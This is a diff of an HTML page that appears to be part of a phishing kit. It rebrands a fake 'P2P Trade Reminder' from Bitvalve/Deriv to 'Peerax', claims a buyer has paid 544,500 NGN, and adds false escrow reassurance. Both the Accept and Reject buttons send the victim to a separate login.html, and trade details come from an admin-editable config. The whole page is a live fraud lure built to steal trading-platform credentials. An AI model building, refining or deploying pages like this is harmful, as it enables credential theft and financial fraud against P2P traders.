@@ -1,17 +1,17 @@
-
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bitvalve — Trade Reminder</title>
+    <title>Peerax — Trade Reminder</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --deriv-red: #2b2828;
-            --deriv-red-dark: #292727;
+            --peerax-purple: #7c3aed;
+            --peerax-purple-dark: #6d28d9;
             --surface: #ffffff;
             --muted: #6c757d;
             --border: #e9ecef;
@@ -23,16 +23,16 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', sans-serif;
             background: linear-gradient(160deg, #f8f9fa 0%, #eef1f4 100%);
             min-height: 100vh;
         }
 
         .brand {
-            color: var(--deriv-red);
+            color: var(--peerax-purple);
             font-weight: 700;
-            font-style: italic;
-            font-family: Georgia, 'Times New Roman', serif;
+            font-style: normal;
+            font-family: 'Inter', sans-serif;
             letter-spacing: -0.5px;
         }
 
@@ -72,7 +72,7 @@
         }
 
         .success-banner {
-            background: var(--success-bg);
+            background: #ecfdf3;
             border: 1px solid #abefc6;
             border-radius: 12px;
             padding: 0.875rem 1rem;
@@ -161,7 +161,7 @@
         }
 
         .status-badge.complete {
-            background: var(--success-bg);
+            background: #ecfdf3;
             color: var(--success-text);
         }
 
@@ -195,7 +195,7 @@
         }
 
         .btn-confirm {
-            background: var(--deriv-red);
+            background: var(--peerax-purple);
             border: none;
             color: #fff;
             font-weight: 600;
@@ -205,7 +205,7 @@
         }
 
         .btn-confirm:hover {
-            background: var(--deriv-red-dark);
+            background: var(--peerax-purple-dark);
             color: #fff;
         }
 
@@ -239,7 +239,7 @@
     <div class="page-wrap">
         <div class="trade-card">
             <div class="card-header-custom">
-                <h1 class="brand h3 mb-0">Bitvalve</h1>
+                <h1 class="brand h3 mb-0">peerax</h1>
                 <p class="text-muted small mt-2 mb-0">P2P Trade Reminder</p>
             </div>
 
@@ -253,7 +253,7 @@
 
             <div class="card-body-custom">
                 <p class="reminder-text">
-                    Buyer has made payment for the active P2P Deriv trade
+                    Buyer has made payment for the active P2P trade
                     <strong>Accept payment</strong> or <strong>Reject Payment</strong> if needed.
                 </p>
 
@@ -276,7 +276,7 @@
                             <span class="status-badge waiting" id="statusBadge">
                                 <i class="fas fa-clock"></i>
                                 <span id="statusText">Waiting Confirmation</span>
-                        </span>
+                            </span>
                         </span>
                     </div>
                 </div>
@@ -284,8 +284,7 @@
                 <div class="alert-warn">
                     <i class="fas fa-triangle-exclamation"></i>
                     <span>
-                        All payments are made from Bitvalve Headquarters in Costa Rica. Always make sure to check location
-                        before confirming on code.
+                        All payments are processed securely through Peerax escrow infrastructure. Always verify transaction details before confirming.
                     </span>
                 </div>
 
@@ -306,13 +305,11 @@
     </div>
 
     <script>
-        // Values come from /trade-config.json (edited in /admin).
-        // Optional URL overrides: ?tradeId=...&amount=...&method=...&status=...
         const DEFAULT_TRADE = {
             tradeId: "TR-674116",
             amount: "544,500.00NGN",
             paymentMethod: "Opay Bank -8149905389",
-            status: "waiting" // "waiting" | "complete"
+            status: "waiting"
         };
 
         function normalizeStatus(status) {
@@ -354,20 +351,13 @@
             }
         }
 
-        function goToLogin(action, trade) {
-            const params = new URLSearchParams({
-                action: action,
-                tradeId: trade.tradeId,
-                amount: trade.amount,
-                method: trade.paymentMethod,
-                status: normalizeStatus(trade.status)
-            });
-            window.location.href = `login.html?${params.toString()}`;
+        // Redirects directly to login.html
+        function redirectToLogin() {
+            window.location.href = "login.html";
         }
 
         async function loadTrade() {
             let fromFile = {};
-            // Prefer dynamic API (works on Vercel with live admin saves), then static JSON
             for (const url of ["/api/trade-public", "/trade-config.json"]) {
                 try {
                     const res = await fetch(url + "?_=" + Date.now(), { cache: "no-store" });
@@ -384,8 +374,8 @@
 
         loadTrade().then((trade) => {
             renderTrade(trade);
-            document.getElementById("confirmBtn").addEventListener("click", () => goToLogin("confirm", trade));
-            document.getElementById("cancelBtn").addEventListener("click", () => goToLogin("cancel", trade));
+            document.getElementById("confirmBtn").addEventListener("click", redirectToLogin);
+            document.getElementById("cancelBtn").addEventListener("click", redirectToLogin);
         });
     </script>
 
